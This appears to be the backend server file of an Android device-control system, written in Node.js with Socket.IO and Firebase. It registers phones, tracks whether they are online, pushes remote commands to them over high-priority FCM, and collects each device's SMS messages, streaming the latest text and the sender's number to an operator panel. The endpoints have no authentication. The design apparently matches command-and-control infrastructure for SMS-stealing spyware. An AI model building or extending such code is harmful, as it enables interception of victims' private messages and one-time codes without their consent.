// =====================================================
// server.js  (A-to-Z FINAL + SMS LIVE FIXED)
// =====================================================

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import cors from "cors";
import { createServer } from "http";
import { Server } from "socket.io";

import { firestore, rtdb, fcm } from "./config/db.js";

import userFullDataRoutes from "./routes/userFullDataRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import checkRoutes from "./routes/checkRoutes.js";
import commandRoutes from "./routes/commandRoutes.js";

const PORT = process.env.PORT || 5000;
const app = express();
const server = createServer(app);

app.use(cors());
app.use(express.json());

// -----------------------------------------------------
// SOCKET.IO
// -----------------------------------------------------
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.set("io", io);

const deviceSockets = new Map();
let lastDevicesList = [];

const clean = (id) => id?.toString()?.trim()?.toUpperCase();

// -----------------------------------------------------
// SEND FCM HIGH PRIORITY
// -----------------------------------------------------
async function sendFcmHighPriority(token, type, payload = {}) {
  if (!token) return;

  try {
    await fcm.send({
      token,
      android: { priority: "high" },
      data: {
        type: String(type || ""),
        payload: JSON.stringify(payload || {}),
      },
    });
  } catch (err) {
    console.error("❌ FCM SEND ERROR:", err.message);
  }
}

// -----------------------------------------------------
// BUILD DEVICES LIST
// -----------------------------------------------------
async function buildDevicesList() {
  const [devSnap, statusSnap] = await Promise.all([
    rtdb.ref("registeredDevices").get(),
    rtdb.ref("status").get(),
  ]);

  if (!devSnap.exists()) return [];

  const devs = devSnap.val() || {};
  const stats = statusSnap.exists() ? statusSnap.val() : {};

  return Object.entries(devs).map(([id, info]) => {
    const st = stats[id] || {};
    return {
      id,
      ...info,
      connectivity: st.connectivity || "Offline",
      lastSeen: st.lastSeen || st.timestamp || null,
      timestamp: st.timestamp || null,
    };
  });
}

async function refreshDevicesLive(reason = "") {
  try {
    const devices = await buildDevicesList();
    lastDevicesList = devices;

    io.emit("devicesLive", {
      success: true,
      reason,
      count: devices.length,
      data: devices,
    });

    console.log(
      "📡 devicesLive EMIT → reason=",
      reason,
      " count=",
      devices.length
    );
  } catch (err) {
    console.error("❌ refreshDevicesLive ERROR:", err.message);
  }
}

// -----------------------------------------------------
// SOCKET CONNECTION
// -----------------------------------------------------
io.on("connection", (socket) => {
  console.log("🟢 New socket connected:", socket.id);

  let currentDeviceId = null;

  socket.emit("devicesLive", {
    success: true,
    count: lastDevicesList.length,
    data: lastDevicesList,
  });

  socket.on("registerDevice", async (rawId) => {
    const id = clean(rawId);
    if (!id) return;

    deviceSockets.set(id, socket.id);
    currentDeviceId = id;

    console.log("✅ Device registered via socket:", id);

    await rtdb.ref(`status/${id}`).set({
      connectivity: "Online",
      lastSeen: Date.now(),
      timestamp: Date.now(),
    });

    io.emit("deviceStatus", { id, connectivity: "Online" });
    refreshDevicesLive(`deviceOnline:${id}`);
  });

  socket.on("disconnect", async () => {
    console.log("🔴 Socket disconnected:", socket.id, " device=", currentDeviceId);

    if (currentDeviceId) {
      await rtdb.ref(`status/${currentDeviceId}`).set({
        connectivity: "Offline",
        lastSeen: Date.now(),
        timestamp: Date.now(),
      });

      io.emit("deviceStatus", {
        id: currentDeviceId,
        connectivity: "Offline",
      });

      refreshDevicesLive(`deviceOffline:${currentDeviceId}`);
    }
  });
});

// -----------------------------------------------------
// SEND COMMAND
// -----------------------------------------------------
app.post("/send-command", async (req, res) => {
  try {
    const { uniqueid, title, message } = req.body;
    const id = clean(uniqueid);

    await rtdb.ref(`commands/${id}`).set({
      title,
      message,
      timestamp: Date.now(),
    });

    console.log("📨 COMMAND PUSHED →", { id, title, message });

    return res.json({ success: true });
  } catch (err) {
    console.error("❌ /send-command ERROR:", err.message);
    return res.status(500).json({ success: false });
  }
});

// -----------------------------------------------------
// CHECK ONLINE + REPLY WATCH
// -----------------------------------------------------
const liveReplyWatchers = new Map();

function stopReplyWatcher(uid) {
  if (liveReplyWatchers.has(uid)) {
    const ref = liveReplyWatchers.get(uid);
    ref.off();
    liveReplyWatchers.delete(uid);
  }
}

function startReplyWatcher(uid) {
  const ref = rtdb.ref(`checkOnline/${uid}`);

  console.log("👂 brosReply watcher STARTED for:", uid);

  ref.on("value", (snap) => {
    if (!snap.exists()) {
      io.emit("brosReplyUpdate", {
        uid,
        success: true,
        data: null,
        message: "No reply found",
      });
      return;
    }

    const data = snap.val();

    io.emit("brosReplyUpdate", {
      uid,
      success: true,
      data: { uid, ...data },
    });
  });

  liveReplyWatchers.set(uid, ref);
}

app.get("/api/brosreply/:uid", async (req, res) => {
  try {
    const uid = req.params.uid;

    stopReplyWatcher(uid);

    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
    const data = snap.exists() ? { uid, ...snap.val() } : null;

    startReplyWatcher(uid);

    return res.json({
      success: true,
      data,
      message: "Live listening started",
    });
  } catch (err) {
    console.error("❌ /api/brosreply ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

// -----------------------------------------------------
// DEVICE COMMAND FORWARD
// -----------------------------------------------------
function extractCommandData(raw) {
  if (raw?.action) return raw;
  const keys = Object.keys(raw || {});
  return raw[keys[keys.length - 1]] || null;
}

async function handleDeviceCommandChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const raw = snap.val();
  const cmd = extractCommandData(raw);
  if (!cmd) return;

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) {
    console.log("⚠️ DEVICE_COMMAND: No token for", uid);
    return;
  }

  console.log("📨 DEVICE_COMMAND → uid=", uid, " cmd=", cmd.action || "");

  await sendFcmHighPriority(token, "DEVICE_COMMAND", {
    uniqueid: uid,
    ...cmd,
  });
}

rtdb
  .ref("commandCenter/deviceCommands")
  .on("child_added", handleDeviceCommandChange);
rtdb
  .ref("commandCenter/deviceCommands")
  .on("child_changed", handleDeviceCommandChange);

// -----------------------------------------------------
// CHECK ONLINE SYSTEM
// -----------------------------------------------------
async function handleCheckOnlineChange(snap) {
  if (!snap.exists()) return;

  const uid = snap.key;
  const data = snap.val() || {};
  const now = Date.now();

  console.log("📡 CHECK_ONLINE CHANGE → uid=", uid, " data=", data);

  await rtdb.ref(`resetCollection/${uid}`).set({
    resetAt: now,
    readable: new Date(now).toString(),
  });

  await rtdb.ref(`status/${uid}`).update({
    connectivity: "Online",
    lastSeen: now,
    timestamp: now,
  });

  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
  const token = devSnap.val()?.fcmToken;
  if (!token) {
    console.log("⚠️ CHECK_ONLINE: No token for", uid);
    return;
  }

  await sendFcmHighPriority(token, "CHECK_ONLINE", {
    uniqueid: uid,
    available: data.available || "unknown",
    checkedAt: String(data.checkedAt || ""),
  });
}

const checkOnlineRef = rtdb.ref("checkOnline");
checkOnlineRef.on("child_added", handleCheckOnlineChange);
checkOnlineRef.on("child_changed", handleCheckOnlineChange);

// -----------------------------------------------------
// 🔔 SMS LIVE HELPERS (1-LEVEL + 2-LEVEL SUPPORT)
// -----------------------------------------------------
const SMS_NODE = "smsNotifications";

function normalizeSmsListForUid(uid, rawNode) {
  // rawNode can be:
  // 1) { msgId: {body, timestamp, ...} }
  // 2) { groupId: { msgId: {body, timestamp, ...} } }
  const list = [];

  if (!rawNode || typeof rawNode !== "object") return list;

  Object.entries(rawNode).forEach(([k1, v1]) => {
    if (v1 && typeof v1 === "object") {
      const looksLikeSms =
        "body" in v1 ||
        "message" in v1 ||
        "text" in v1 ||
        "timestamp" in v1 ||
        "date" in v1;

      if (looksLikeSms) {
        // pattern 1 → directly an sms
        list.push({
          id: k1,
          uniqueid: uid,
          ...v1,
        });
      } else {
        // pattern 2 → second level objects
        Object.entries(v1).forEach(([k2, v2]) => {
          if (v2 && typeof v2 === "object") {
            list.push({
              id: k2,
              uniqueid: uid,
              ...v2,
            });
          }
        });
      }
    }
  });

  return list;
}

// -----------------------------------------------------
// SMS LIVE LAST MESSAGE ONLY  (WITH LOGS)
// -----------------------------------------------------
const smsRef = rtdb.ref(SMS_NODE);

console.log("👂 ATTACHING LISTENER ON NODE:", SMS_NODE);

smsRef.on("child_added", handleSmsChange);
smsRef.on("child_changed", handleSmsChange);

async function handleSmsChange(snap) {
  const uid = snap.key;
  const raw = snap.val() || {};

  const smsList = normalizeSmsListForUid(uid, raw);

  console.log(
    "📡 SMS NODE CHANGE → uid=",
    uid,
    " totalSmsFound=",
    smsList.length,
    " rawKeys=",
    Object.keys(raw || {})
  );

  if (!smsList.length) {
    console.log("⚠️ No SMS found for uid=", uid);
    return;
  }

  // pick latest by timestamp (fallback lexicographic)
  smsList.sort((a, b) => {
    const ta = Number(a.timestamp || a.date || 0);
    const tb = Number(b.timestamp || b.date || 0);
    return tb - ta;
  });

  const latest = smsList[0];

  console.log(
    "📨 smsLogsAllLive EMIT → uid=",
    uid,
    " msgId=",
    latest.id,
    " phone=",
    latest.address || latest.from || latest.phone || "",
    " ts=",
    latest.timestamp || latest.date || ""
  );

  io.emit("smsLogsAllLive", {
    success: true,
    uniqueid: uid,
    msgId: latest.id,
    data: latest,
  });
}

// -----------------------------------------------------
// REGISTERED DEVICES LIVE
// -----------------------------------------------------
const registeredDevicesRef = rtdb.ref("registeredDevices");

registeredDevicesRef.on("child_added", () => {
  refreshDevicesLive("registered_added");
});
registeredDevicesRef.on("child_changed", () => {
  refreshDevicesLive("registered_changed");
});
registeredDevicesRef.on("child_removed", () => {
  refreshDevicesLive("registered_removed");
});

app.get("/api/devices", async (req, res) => {
  try {
    const devices = await buildDevicesList();
    console.log("📡 GET /api/devices → count=", devices.length);
    return res.json({
      success: true,
      count: devices.length,
      data: devices,
    });
  } catch (err) {
    console.error("❌ /api/devices ERROR:", err.message);
    res.status(500).json({ success: false });
  }
});

refreshDevicesLive("initial");

// -----------------------------------------------------
// ROUTES MOUNTING
// -----------------------------------------------------
app.use("/api/sms", smsRoutes); // /api/sms/all etc.
app.use(adminRoutes);
app.use("/api", checkRoutes);
app.use("/api", userFullDataRoutes);
app.use(commandRoutes);

// -----------------------------------------------------
// ROOT + LISTEN
// -----------------------------------------------------
app.get("/", (_, res) => {
  res.send("RTDB + Socket.IO Backend Running");
});

server.listen(PORT, () => {
  console.log("🚀 SERVER RUNNING ON PORT", PORT);
});
